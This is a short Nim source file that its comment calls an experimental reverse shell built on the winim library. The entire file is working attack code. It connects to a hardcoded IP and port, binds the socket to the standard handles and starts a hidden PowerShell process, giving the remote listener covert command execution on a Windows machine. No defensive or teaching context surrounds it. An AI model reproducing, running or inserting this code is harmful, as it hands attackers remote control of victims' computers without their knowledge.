# just an experimental reverse shell using winim
import winim/lean, strutils

const
  REVERSE_IP = "10.0.0.39"
  REVERSE_PORT = 9999

proc reverseShell() =
  var
    wsaData: WSADATA
    sock: SOCKET
    server: sockaddr_in
    si: STARTUPINFOA
    pi: PROCESS_INFORMATION

  discard WSAStartup(MAKEWORD(2, 2), addr wsaData)

  sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)
  server.sin_family = AF_INET
  server.sin_port = htons(REVERSE_PORT.uint16)
  server.sin_addr.S_addr = inet_addr(REVERSE_IP)

  if WSAConnect(sock, cast[ptr SOCKADDR](addr server), sizeof(server).int32, NULL, NULL, NULL, NULL) != 0:
    return

  ZeroMemory(addr si, sizeof(si))
  si.cb = sizeof(si).DWORD
  si.dwFlags = STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW
  si.wShowWindow = SW_HIDE
  si.hStdInput = cast[HANDLE](sock)
  si.hStdOutput = cast[HANDLE](sock)
  si.hStdError = cast[HANDLE](sock)

  discard CreateProcessA(
    NULL,
    "powershell.exe",
    NULL,
    NULL,
    TRUE,
    0,
    NULL,
    NULL,
    addr si,
    addr pi
  )

when isMainModule:
  reverseShell()
